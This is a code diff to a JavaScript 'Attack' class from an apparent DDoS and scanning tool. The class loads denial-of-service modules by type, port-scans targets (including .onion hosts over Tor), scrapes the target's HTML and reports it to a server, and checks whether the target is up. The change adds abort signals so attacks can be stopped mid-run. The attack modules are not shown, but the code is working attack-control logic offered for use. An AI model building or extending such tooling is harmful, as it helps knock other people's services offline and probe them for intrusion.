@@ -19,6 +19,7 @@ class Attack {
     this.maxRetries = 3;
     this.currentRetry = 0;
     this.isTor = this.target.includes('.onion');
+    this.abortController = new AbortController();
   }
 
   async start() {
@@ -29,6 +30,7 @@ class Attack {
     this.stats.status = 'Starting';
     this.stats.errors = 0;
     this.currentRetry = 0;
+    this.abortController = new AbortController();
 
     await this.executeWithRetry();
 
@@ -68,6 +70,7 @@ class Attack {
     this.isRunning = false;
     this.stats.status = 'Stopped';
     clearInterval(this.intervalId);
+    this.abortController.abort();
 
     if (this.attackInstance && this.attackInstance.stop) {
       this.attackInstance.stop();
@@ -83,7 +86,7 @@ class Attack {
 
     try {
       const ddosModule = await import(`./ddos/${ddosType}.js`);
-      this.ddosAttack = new ddosModule.default(this.target, this.options, this.isTor);
+      this.ddosAttack = new ddosModule.default(this.target, this.options, this.isTor, this.abortController.signal);
       this.attackInstance = this.ddosAttack;
 
       this.stats.status = 'DDoSing';
@@ -106,11 +109,13 @@ class Attack {
           },
           body: JSON.stringify({
             target: this.target
-          })
+          }, null, 2),
+          signal: this.abortController.signal
         });
       } else {
         response = await fetch(this.target, {
-          mode: 'cors'
+          mode: 'cors',
+          signal: this.abortController.signal
         });
       }
 
@@ -145,7 +150,8 @@ class Attack {
         body: JSON.stringify({
           target: this.target,
           html: html
-        })
+        }, null, 2),
+        signal: this.abortController.signal
       });
 
       if (!submitResponse.ok) {
@@ -169,6 +175,7 @@ class Attack {
         this.stats.status = 'Port Scan Interrupted';
       }
     };
+
     for (const port of ports) {
       if (!this.isRunning) break;
 
@@ -176,9 +183,13 @@ class Attack {
       try {
         let response;
         if (this.isTor) {
-          response = await fetch(`/tor-portscan?target=${this.target}&port=${port}`);
+          response = await fetch(`/tor-portscan?target=${this.target}&port=${port}`, {
+            signal: this.abortController.signal
+          });
         } else {
-          response = await fetch(`/portscan?target=${this.target}&port=${port}`);
+          response = await fetch(`/portscan?target=${this.target}&port=${port}`, {
+            signal: this.abortController.signal
+          });
         }
         const data = await response.json();
         if (data.open) {
@@ -204,7 +215,8 @@ class Attack {
 
     const corsMode = this.isTor ? 'no-cors' : 'cors';
     fetch(this.target, {
-        mode: corsMode
+        mode: corsMode,
+        signal: this.abortController.signal
       })
       .then(response => {
         this.stats.status = response.ok ? 'Online' : 'Unresponsive';
@@ -218,6 +230,13 @@ class Attack {
   handleAttackError(error) {
     this.stats.errors++;
     this.stats.lastError = error.message || 'Unknown error';
+
+    if (error.name === 'AbortError') {
+      console.log('Attack aborted by user.');
+      this.stats.status = 'Aborted';
+      this.stop();
+      return;
+    }
 
     if (this.stats.errors > this.errorThreshold) {
       if (this.currentRetry < this.maxRetries) {
